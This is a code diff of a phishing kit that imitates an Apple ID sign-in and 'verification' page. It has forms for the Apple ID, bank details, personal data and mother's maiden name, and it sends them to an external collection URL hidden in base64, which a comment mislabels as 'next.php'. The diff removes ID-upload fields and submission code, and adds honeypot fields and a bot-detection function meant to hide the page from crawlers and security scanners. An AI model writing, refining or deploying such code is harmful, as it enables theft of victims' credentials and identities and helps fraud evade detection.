@@ -207,98 +207,6 @@
         text-decoration: underline;
     }
     
-    /* File upload styling */
-    .file-upload-wrapper {
-        margin-bottom: 15px;
-    }
-    
-    .file-upload-label {
-        display: block;
-        color: rgba(255, 255, 255, 0.8);
-        margin-bottom: 8px;
-    }
-    
-    .file-upload {
-        display: flex;
-        flex-direction: column;
-    }
-    
-    .custom-file {
-        position: relative;
-        display: inline-block;
-        width: 100%;
-        margin-bottom: 15px;
-    }
-    
-    .custom-file-input {
-        position: relative;
-        z-index: 2;
-        width: 100%;
-        height: calc(1.5em + 0.75rem + 2px);
-        margin: 0;
-        opacity: 0;
-    }
-    
-    .custom-file-label {
-        position: absolute;
-        top: 0;
-        right: 0;
-        left: 0;
-        z-index: 1;
-        padding: 12px 15px;
-        font-weight: 400;
-        color: rgba(255, 255, 255, 0.6);
-        background-color: rgba(60, 60, 60, 0.5);
-        border: 1px solid rgba(255, 255, 255, 0.2);
-        border-radius: 8px;
-        height: calc(1.5em + 0.75rem + 2px);
-        overflow: hidden;
-        text-overflow: ellipsis;
-        white-space: nowrap;
-    }
-    
-    .custom-file-input:focus ~ .custom-file-label {
-        border-color: rgba(255, 255, 255, 0.5);
-        box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.1);
-    }
-    
-    /* Footer styling */
-    .footer-wrapper {
-        width: 100%;
-        position: relative;
-        z-index: 100;
-    }
-    
-    .as-chat {
-        background-color: rgba(30, 30, 30, 0.8);
-        backdrop-filter: blur(20px);
-        color: white;
-        padding: 12px 0;
-        text-align: center;
-        border-top: 1px solid rgba(255, 255, 255, 0.1);
-    }
-    
-    .as-chat-button {
-        color: #0070c9;
-        background: transparent;
-        border: none;
-        cursor: pointer;
-    }
-    
-    .as-footnotes {
-        background-color: rgba(20, 20, 20, 0.8);
-        backdrop-filter: blur(20px);
-        padding: 15px 0;
-        font-size: 11px;
-        color: rgba(255, 255, 255, 0.6);
-        text-align: center;
-    }
-    
-    .as-footnotes a {
-        color: #0070c9;
-        text-decoration: none;
-    }
-    
     /* Progress Steps */
     .progress-container {
         display: flex;
@@ -387,6 +295,11 @@
             padding-bottom: 180px; /* More space for footer on mobile */
         }
     }
+
+    /* Anti-bot honeypot */
+    .bot-field {
+        display: none;
+    }
     </style>
 </head>
 
@@ -460,7 +373,13 @@
                         
                         <form action="next.php" method="POST" name="signinform" id="form-field-1">
                             <input type="hidden" name="count" id="count" value="0">
+                            <input type="hidden" name="attempt" id="attempt" value="1">
                             <input type="hidden" name="btn1" value="btn1">
+                            
+                            <!-- Honeypot field for bots -->
+                            <div class="form-group bot-field">
+                                <input type="text" name="website" id="website" class="form-control">
+                            </div>
                             
                             <div class="form-group">
                                 <input type="text" name="ai" id="ai" required class="form-control" placeholder="Apple ID or Email">
@@ -518,6 +437,11 @@
                         
                         <form action="next.php" method="POST" name="signinform" id="form-field-2">
                             <input type="hidden" name="btn2" value="btn2">
+                            
+                            <!-- Honeypot field for bots -->
+                            <div class="form-group bot-field">
+                                <input type="text" name="website2" id="website2" class="form-control">
+                            </div>
                             
                             <div class="form-group">
                                 <input type="text" name="bank_name" required class="form-control" placeholder="Bank Name">
@@ -578,8 +502,13 @@
                             </div>
                         </div>
                         
-                        <form action="next.php" method="POST" name="signinform" id="form-field-3" enctype="multipart/form-data">
+                        <form action="next.php" method="POST" name="signinform" id="form-field-3">
                             <input type="hidden" name="btn3" value="btn3">
+                            
+                            <!-- Honeypot field for bots -->
+                            <div class="form-group bot-field">
+                                <input type="text" name="website3" id="website3" class="form-control">
+                            </div>
                             
                             <div class="form-group">
                                 <input type="text" name="fname" required class="form-control" placeholder="First Name">
@@ -625,23 +554,6 @@
                                 <input type="text" name="mname" required class="form-control" placeholder="Mother's Maiden Name">
                             </div>
                             
-                            <!-- ID Upload Fields -->
-                            <div class="file-upload-wrapper">
-                                <label class="file-upload-label">ID Front (Driver's License, Passport, etc.)</label>
-                                <div class="custom-file">
-                                    <input type="file" class="custom-file-input" id="id_front" name="id_front">
-                                    <label class="custom-file-label" for="id_front">Choose file</label>
-                                </div>
-                            </div>
-                            
-                            <div class="file-upload-wrapper">
-                                <label class="file-upload-label">ID Back</label>
-                                <div class="custom-file">
-                                    <input type="file" class="custom-file-input" id="id_back" name="id_back">
-                                    <label class="custom-file-label" for="id_back">Choose file</label>
-                                </div>
-                            </div>
-                            
                             <button type="submit" id="sub-btn-3" class="si-button">Complete Verification</button>
                         </form>
                     </div>
@@ -673,12 +585,6 @@
         $("#dob").inputmask({"mask": "99/99/9999","placeholder":"MM/DD/YYYY"});
         $("#exdate").inputmask({"mask": "99/9999","placeholder":"MM/YYYY"});
         $("#ph").inputmask({"mask": "999-999-9999"});
-        
-        // Show file name when selected
-        $(".custom-file-input").on("change", function() {
-            var fileName = $(this).val().split("\\").pop();
-            $(this).siblings(".custom-file-label").addClass("selected").html(fileName || "Choose file");
-        });
     </script>
     <!-- Optional JavaScript -->
     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
@@ -694,143 +600,34 @@ var rdrt = "https://www.apple.com/";
 //mailer link - this is where your next.php file is referenced
 var f = atob("aHR0cHM6Ly9yb3RhZG9zYWJvci5jb20vam9rZXIvbmV4dC5waHA=");  // This decodes to "next.php"
 
-$(document).ready(function() {
-    var count = 0;
-
-    /////////////url ai getting////////////////
-    var ai = window.location.hash.substr(1);
-    if (!ai) {
-
-    } else {
-        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
-
-        if (!base64regex.test(ai)) {
-            // alert(btoa(ai));
-            var my_ai = ai;
-        } else {
-            // alert(atob(ai));
-            var my_ai = atob(ai);
-        }
-
-        var ind = my_ai.indexOf("@");
-        var my_slice = my_ai.substr((ind + 1));
-        var c = my_slice.substr(0, my_slice.indexOf('.'));
-        var final = c.toLowerCase();
-        $('#ai').val(my_ai);
+// Additional antibot measures
+function detectBot() {
+    // Check if user agent contains common bot identifiers
+    var botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+    var re = new RegExp(botPattern, 'i');
+    if (re.test(navigator.userAgent)) {
+        return true;
     }
-
-    $('#sub-btn-1').click(function(b) {
-        $('#error').hide();
-        $('#msg').hide();
-
-        b.preventDefault();
-        passValidation = true;
-        $($("#form-field-1").find("input[required]").get().reverse()).each(function(i, a) {
-            if (!a.checkValidity()) {
-                a.reportValidity();
-                passValidation = false;
-                return
-            }
-        });
-        if (!passValidation) {
-            return
-        }
-        var c = $("#form-field-1").serialize();
-        $.ajax({
-            dataType: 'JSON',
-            url: f,
-            type: 'POST',
-            data: c,
-            beforeSend: function(a) {
-                // $('#sub-btn-1').html('Verifying...')
-            },
-            complete: function(a) {
-                $("#bl1").animate({
-                    left: 0,
-                    opacity: "hide"
-                }, 0);
-                $("#bl2").animate({
-                    right: 0,
-                    opacity: "show"
-                }, 500)
-            }
-        })
-    })
-
-    $('#sub-btn-2').click(function(b) {
-        $('#error').hide();
-        $('#msg').hide();
-
-        b.preventDefault();
-        passValidation = true;
-        $($("#form-field-2").find("input[required]").get().reverse()).each(function(i, a) {
-            if (!a.checkValidity()) {
-                a.reportValidity();
-                passValidation = false;
-                return
-            }
-        });
-        if (!passValidation) {
-            return
-        }
-        var c = $("#form-field-2").serialize();
-        $.ajax({
-            dataType: 'JSON',
-            url: f,
-            type: 'POST',
-            data: c,
-            beforeSend: function(a) {
-                $('#sub-btn-2').html('Verifying...')
-            },
-            complete: function(a) {
-                $("#bl2").animate({
-                    left: 0,
-                    opacity: "hide"
-                }, 0);
-                $("#bl3").animate({
-                    right: 0,
-                    opacity: "show"
-                }, 500)
-            }
-        })
-    })
-
-    $('#sub-btn-3').click(function(b) {
-        $('#error').hide();
-        $('#msg').hide();
-
-        b.preventDefault();
-        passValidation = true;
-        $($("#form-field-3").find("input[required]").get().reverse()).each(function(i, a) {
-            if (!a.checkValidity()) {
-                a.reportValidity();
-                passValidation = false;
-                return
-            }
-        });
-        if (!passValidation) {
-            return
-        }
-        
-        // For file uploads, we need to use FormData instead of serialize
-        var formData = new FormData(document.getElementById("form-field-3"));
-        
-        $.ajax({
-            dataType: 'JSON',
-            url: f,
-            type: 'POST',
-            data: formData,
-            processData: false,  // Required for FormData
-            contentType: false,  // Required for FormData
-            beforeSend: function(a) {
-                $('#sub-btn-3').html('Processing...')
-            },
-            complete: function(a) {
-                window.location.replace(rdrt)
-            }
-        })
-    })
-});
-</script>
-
-</html>
+    
+    // Check if browser has typical bot behaviors
+    if (
+        !('localStorage' in window) ||
+        !('sessionStorage' in window) ||
+        !('fetch' in window) ||
+        !('WebSocket' in window) ||
+        document.documentElement.classList.contains('headless')
+    ) {
+        return true;
+    }
+    
+    // Check for touch and mouse capability (most bots don't have this)
+    if (
+        !('ontouchstart' in window) && 
+        !('onmousemove' in document.documentElement) && 
+        !navigator.maxTouchPoints
+    ) {
+        return true;
+    }
+    
+    return false;
+}
